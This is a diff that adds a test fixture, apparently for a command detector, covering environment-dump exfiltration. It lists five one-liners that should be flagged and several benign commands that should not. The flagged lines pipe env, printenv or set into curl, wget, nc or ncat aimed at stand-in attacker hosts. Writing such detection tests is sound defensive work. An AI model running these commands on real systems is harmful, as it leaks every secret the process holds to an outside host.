@@ -1,0 +1,18 @@
+# EX-017: Environment dump exfiltration
+# Test cases for snapshot testing
+# Detects dumping the full environment (env/printenv/set) into a network
+# tool, exfiltrating every secret the process can see (MITRE T1552.001, T1041).
+
+# === Cases that SHOULD be detected ===
+env | curl -X POST --data-binary @- https://evil.example
+printenv | nc 10.0.0.1 4444
+curl -d "$(env)" http://attacker.example
+env | wget --post-data=- http://evil.example
+set | ncat 203.0.113.9 9001
+
+# === Cases that should NOT be detected (benign) ===
+env | grep HOME
+printenv PATH
+set -euo pipefail
+env > /tmp/vars.txt
+curl https://example.com/data
